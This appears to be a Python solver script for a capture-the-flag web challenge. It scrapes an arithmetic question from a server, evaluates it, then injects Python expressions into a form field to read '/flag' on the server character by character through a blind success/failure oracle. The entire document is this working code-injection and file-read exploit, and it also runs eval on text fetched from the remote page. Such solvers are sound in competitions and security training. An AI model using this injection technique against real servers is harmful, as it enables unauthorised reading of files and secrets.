import requests
import bs4
url = "http://10.51.0.34/"
session = requests.session()
webdata = session.get(url).text
# print(webdata)
soup = bs4.BeautifulSoup(webdata,features="html.parser")
# print(soup)
question = soup.find_all("h4")
print(question)
answer = eval(question[0].text[:-1])
print(answer)
s = "qwertyuiopasdfghjklzxcvbnm1234567890{}"
flag = "DASCTF{"
for i in range(40):
    for j in s:
        payload = str(answer) + " and '" + flag + j + "' in open('/flag','r').read()"
        print(payload)
        data = {'input':payload}
        result = session.post(url,data=data).text
        if "Congratulations" in result:
            flag = flag + j
            # print(flag)
            break
        session = requests.session()
        webdata = session.get(url).text
        soup = bs4.BeautifulSoup(webdata, features="html.parser")
        question = soup.find_all("h4")
        answer = eval(question[0].text[:-1])
# print(flag)